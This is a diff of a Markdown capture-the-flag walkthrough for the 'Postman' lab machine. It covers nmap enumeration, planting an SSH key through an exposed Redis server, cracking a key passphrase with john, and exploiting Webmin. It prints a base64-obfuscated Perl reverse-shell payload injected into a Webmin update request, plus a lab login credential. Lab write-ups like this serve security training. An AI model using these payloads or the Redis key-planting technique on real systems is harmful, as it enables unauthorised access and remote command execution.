@@ -1,40 +1,37 @@
 # Postman
 
-Tags
+Info
+* OS: Linux
+* Difficulty: easy
+* IP: `10.10.10.160`
 
+Vulnerabilities
 * redis
+* webmin
+
+Required tools
+* nmap
 * burpsuite
 * john
 * metasploit
-* webmin vulnerability
+
+Other tools
+* redis-cli
+* exiftool https://exiftool.org
+* gobuster https://github.com/OJ/gobuster
+
+## Walkthrough
+
+Other
 * [IppSec](https://www.youtube.com/watch?v=jJnHET1o8ZQ) (video)
 
-Scan ports
+### Enumeration
 
+Nmap
 ```bash
-make do-access
-docker exec -it htb-lab bash
+nmap -p- -T4 --min-rate=1000 -sC -sV 10.10.10.160
 
-# machine ip
-ping 10.10.10.160
-
-# output folder
-mkdir -p /share/postman
-
-# -n: Never do DNS resolution
-# -Pn: Treat all hosts as online (skip host discovery)
-# -sC: equivalent to --script=default
-# -sV: Probe open ports to determine service/version info
-# -p-: All ports
-# --min-rate <number>: Send packets no slower than <number> per second
-# -oA <basename>: Output in the three major formats at once
-# -v: Increase verbosity level
-nmap -n -Pn -sC -sV -p- --min-rate 1000 -oA /share/postman/nmap -v 10.10.10.160
-```
-
-Nmap output
-
-```
+# output
 PORT      STATE SERVICE VERSION
 22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -42,22 +39,15 @@ PORT      STATE SERVICE VERSION
 |   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
 |_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
 80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
-| http-methods: 
-|_  Supported Methods: POST OPTIONS HEAD GET
-|_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: The Cyber Geek's Personal Website
+|_http-server-header: Apache/2.4.29 (Ubuntu)
 6379/tcp  open  redis   Redis key-value store 4.0.9
 10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
-|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Probe open ports
-
+Verify open ports
 ```bash
 ssh root@10.10.10.160
 http 10.10.10.160:80
@@ -65,20 +55,20 @@ echo "PING" | nc 10.10.10.160 6379
 http --verify=no https://10.10.10.160:10000
 ```
 
-* [Unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)
-
+Redis [unauthorized SSH access](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh)
 ```bash
-mkdir -p /share/postman/keys
-
 # generate key pair
-ssh-keygen -N "" -f /share/postman/keys/postman
+ssh-keygen -N "" -f ~/.ssh/postman
 
 # important append \n\n before and after the pub key
-(echo -e "\n\n"; cat /share/postman/keys/postman.pub; echo -e "\n\n") > /share/postman/keys/postman.txt
+(echo -e "\n\n"; cat ~/.ssh/postman.pub; echo -e "\n\n") > ~/.ssh/postman.txt
+
+# install client
+apt install -y redis
+redis-cli -h 10.10.10.160
 
 # create fake redis key/value (without `save` it's lost)
-apk add redis
-cat /share/postman/keys/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman
+cat ~/.ssh/postman.txt | redis-cli -h 10.10.10.160 -x set ssh-postman
 
 # continue the commands and save
 nc -v 10.10.10.160 6379
@@ -92,13 +82,14 @@ config set dbfilename authorized_keys
 save
 
 # private key permissions
-chmod 600 /share/postman/keys/postman
+chmod 600 ~/.ssh/postman
 # access to instance "redis@Postman"
-ssh -i /share/postman/keys/postman redis@10.10.10.160
+ssh -i ~/.ssh/postman redis@10.10.10.160
 ```
 
-Upload privesc scripts from lab
+--- TODO review
 
+Upload privesc scripts from lab
 ```bash
 # save <LAB_IP_ADDRESS> from tun0
 ifconfig
@@ -123,14 +114,12 @@ bash LinEnum.sh
 ```
 
 Output of privesc scripts
-
 ```
 [-] Location and Permissions (if accessible) of .bak file(s):
 -rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
 ```
 
 Brute force encrypted key passphrase
-
 ```bash
 # copy from redis@Postman
 cat /opt/id_rsa.bak 
@@ -152,7 +141,6 @@ su - Matt
 ```
 
 Metasploit
-
 ```bash
 docker exec -it htb-metasploit bash
 openvpn /share/*.ovpn
@@ -211,7 +199,6 @@ exploit
 ```
 
 Inspect request
-
 ```
 # headers
 POST /package-updates/update.cgi HTTP/1.1
@@ -232,7 +219,6 @@ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*
 ```
 
 Setup Burp
-
 ```bash
 # download certificate
 http://localhost:8080
@@ -415,23 +401,43 @@ root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
 cat /root/root.txt
 ```
 
-***
+---
 
-POST /session\_login.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: testing=1 Content-Type: application/x-www-form-urlencoded Content-Length: 33 Connection: close
+POST /session_login.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: testing=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+Connection: close
 
-page=\&user=Matt\&pass=computer2008
+page=&user=Matt&pass=computer2008
 
-***
+---
 
-POST /proc/index\_tree.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9 Referer: https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1 Content-Type: application/x-www-form-urlencoded Content-Length: 0 Connection: close
+POST /proc/index_tree.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9
+Referer: https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+Connection: close
 
-***
+---
 
-POST /package-updates/update.cgi HTTP/1.1 Host: 10.10.10.160:10000 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9 Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1 Content-Type: application/x-www-form-urlencoded Content-Length: 440 Connection: close
+POST /package-updates/update.cgi HTTP/1.1
+Host: 10.10.10.160:10000
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9
+Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 440
+Connection: close
 
-u=acl%2Fapt\&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22\&ok\_top=Update+Selected+Packages
+u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
 
-***
+---
 
 https://lillox.info/postman-machine.html
 
